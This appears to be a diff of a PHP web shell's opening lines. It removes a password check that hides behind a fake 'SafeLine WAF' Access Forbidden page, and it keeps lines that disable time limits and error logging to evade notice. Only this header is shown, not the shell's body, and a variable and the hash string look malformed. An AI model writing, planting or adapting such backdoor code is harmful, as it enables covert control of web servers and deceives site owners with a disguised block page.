@@ -1,20 +1,5 @@
 <?php
 
-$PASSWORD_HASH = '$$2a$12$TkXMTOFN/9RcY77UwYCEFugOlSQRAew6NKGqeZGaMOxsyqaYLwYc6'; 
-
-if(!isset($_GET[$PARAM_NAME]) || !password_verify($_GET[$PARAM_NAME], $PASSWORD_HASH)) {
-    header('HTTP/1.0 403 Forbidden');
-    die('<!DOCTYPE html>
-    <html>
-    <head><title>Access Forbidden</title></head>
-    <body style="background:#0a0a0a;color:#ccc;font-family:Arial;text-align:center;padding:50px;">
-    <h1 style="color:#ff4444;">Access Forbidden</h1>
-    <p>You don\'t have permission to access this resource.</p>
-    <p>Security Detection Powered By SafeLine WAF</p>
-    </body>
-    </html>');
-}
-
 @set_time_limit(0);
 @clearstatcache();
 @ini_set('error_log', NULL);
